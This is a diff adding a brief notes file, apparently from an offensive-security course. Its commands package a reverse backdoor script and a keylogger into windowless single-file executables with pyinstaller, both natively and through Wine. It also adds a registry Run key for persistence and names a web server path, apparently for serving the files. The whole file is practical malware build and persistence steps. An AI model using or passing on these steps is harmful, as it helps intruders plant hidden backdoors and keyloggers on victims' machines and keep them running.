@@ -1,0 +1,22 @@
+## apache2
+# path = /var/www/html
+
+
+## Executable creation
+
+## On Windows
+# python.exe -m pip install pyinstaller
+# pyinstaller.exe reverse_backdoor.py --onefile --noconsole
+
+# Persistence idea
+# reg add HKCU\software\Microsoft\windows\CurrentVersion\Run /v test /t REG_SZ /d "c:/test.exe"
+
+## On Unix
+
+# wine msieec /i python-2.7.14.msi
+
+# wine python.exe -m pip install pyinstaller
+# wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe reverse_backdoor.py --onefile --noconsole
+
+# wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe start_logger.py --onefile --noconsole
+# wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput
